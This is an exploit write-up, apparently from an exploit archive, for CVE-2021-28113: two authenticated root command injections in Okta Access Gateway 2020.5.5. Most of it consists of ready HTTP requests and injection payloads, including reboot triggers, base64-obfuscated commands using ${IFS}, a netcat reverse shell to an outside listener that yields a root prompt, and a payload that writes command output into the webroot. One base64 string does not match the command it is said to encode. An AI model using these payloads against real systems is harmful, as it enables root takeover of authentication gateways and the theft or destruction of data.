@@ -1,0 +1,138 @@
+id: 36532
+date: 07/07/2021
+title: Okta Access Gateway 2020.5.5 Authenticated Remote Root Vulnerability
+author: Jeremy Brown
+cves: CVE-2021-28113
+
+Okta Access Gateway v2020.5.5 Post-Auth Remote Root RCE
+
+CVE-2021-28113
+
+=======
+Details
+=======
+
+There are two command injection bugs can that be triggered after authenticating to the web UI.
+Since the injection occurs when a script is executed with sudo, the commands are ran with root
+privileges.
+
+BUG #1 - relay
+
+Command injection as root in Applications via the 'relaydomain' field when passing
+parameters to generateCert.sh. This is blind injection, so without monitoring logs or
+local execution instrumentation, the output will not simply returned in the response.
+
+Also, the included 'nc' binary that the system image includes has the -e flag available
+which enables an exploitation easier via connect back shell.
+
+[Request]
+
+POST /api/v1/app/idp/[valid-IDP] HTTP/1.1
+Host: gw-admin.domain.tld
+Content-Type: application/json;charset=utf-8
+X-CSRF-TOKEN: [placeholder]
+Content-Length: 134
+Cookie: CSRF-TOKEN=[placeholder]; JSESSIONID=[placeholder]; SessionCookie=[placeholder]
+
+{"settings":
+{"label":"test",
+"type":"CERTHEADER2015_APP",
+"relaydomain":"..$(whoami)", <-- HERE
+"groups":[],
+"handlers":{}}
+,"policies":[{}]}
+
+[Response /w local instrumentation for monitoring]
+
+pid=23033 executed [/bin/bash /opt/oag/bin/generateCert.sh -w -d .root ]
+
+[Quick testing]
+
+"relaydomain":"..$(reboot)"
+
+and the system should reboot.
+
+[Exploitation for reverse shell]
+
+Note: for some bizzare reason, this payload worked for a period of time during testing, but was not generally reproducible afterwards.
+
+1) generate base64 for the connect back command to be executed
+
+$ echo -n "nc 10.0.0.111 5000 -e /bin/bash" | base64
+bmMgMTAuMTAuMTAuMTc5IDU1NTUgLWUgL2Jpbi9iYXNo
+
+2) start a listener
+
+$ nc -l -p 5000
+...
+
+3) make the request with the payload (.. is required due to how it parses domains)
+
+..$(echo${IFS}'bmMgMTAuMC4wLjExMSA1MDAwIC1lIC9iaW4vYmFzaA=='>test;$(base64${IFS}-d${IFS}test))
+
+4) get a root shell from the server
+
+* connection from 10.0.0.77 *
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+[0] root@oag.okta.com;/root#
+
+BUG #2 - cookie
+
+Command injection as root in Identity Providers via the 'cookieDomain' field when passing
+parameters to generateCert.sh.
+
+[Request]
+
+POST /api/v1/setting/idp/local HTTP/1.1
+Host: gw-admin.domain.tld
+Content-Type: application/json;charset=utf-8
+X-CSRF-TOKEN: [placeholder]
+Content-Length: 222
+Cookie: CSRF-TOKEN=[placeholder]; JSESSIONID=[placeholder]; SessionCookie=[placeholder]
+
+{"subCategory":
+"IDP_SAML_LOCAL",
+"json":{
+"name":"Local OAG IDP",
+"host":"https://google.com",
+"cookieDomain":"$(uname${IFS}-n)", <-- HERE
+"nameIDFormat":"urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified",
+"metadata":{}},
+"$edit":true}
+
+[Response /w local instrumentation for monitoring]
+
+pid=22822 executed [/bin/bash /opt/oag/bin/generateCert.sh -w -d Linux oag 3.10.0-957.27.2.el7.x86_64
+#1 SMP Mon Jul 29 17:46:05 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux uid=0(root) gid=0(root) groups=0(root) ]
+
+[Quick testing]
+
+"cookieDomain":"$(reboot)"
+
+and the system should reboot.
+
+[Exploitation for executing commands with output in the webroot]
+
+Same note as the previous one; for some reason, this payload worked for a period of time during testing, but then stopped fully working (the bug was still there just less exploitable).
+
+1) generate base64 for "ls -al /root" to be written to a location accessible via web request
+
+$ echo -n "script -q -c ls\$IFS-al\$IFS/root /opt/oag/simpleSAMLphp/www/test.php" | base64 -w0
+c2NyaXB0IC1xIC1jIGxzJElGUy1hbCRJRlMvcm9vdCAvb3B0L29hZy9zaW1wbGVTQU1McGhwL3d3dy90ZXN0LnBocA==
+
+2) make the request with the payload
+
+$(echo${IFS}'c2NyaXB0IC1xIC1jIGxzJElGUy1hbCRJRlMvcm9vdCAvb3B0L29hZy9zaW1wbGVTQU1McGhwL3d3dy90ZXN0LnBocA=='>test;$(base64${IFS}-d${IFS}test))
+
+3) check https://gw-admin.domain.tld/auth/test.php for the output of the command
+
+===
+Fix
+===
+
+The cookie bug was a "known issue" and fixed in v2020.9.3 and the relay bug was also fixed and no longer works on the latest v2021.2.1.
+
+https://www.okta.com/security-advisories/cve-2021-28113/
+
+#  0day.today [2023-03-25]  #
